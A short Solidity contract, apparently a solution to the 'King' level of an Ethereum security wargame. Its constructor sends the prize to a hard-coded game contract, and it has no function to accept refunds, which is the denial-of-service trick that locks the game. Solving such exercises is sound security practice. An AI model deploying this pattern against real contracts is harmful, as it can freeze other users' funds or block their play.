// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel09.sol";

contract Newking{
    King level9 = King(0xD62Ebd3eD82D885bFF312C3F06762f1B38373341);
    constructor() public payable{
        address(level9).call{value: level9.prize()}("");
    }
}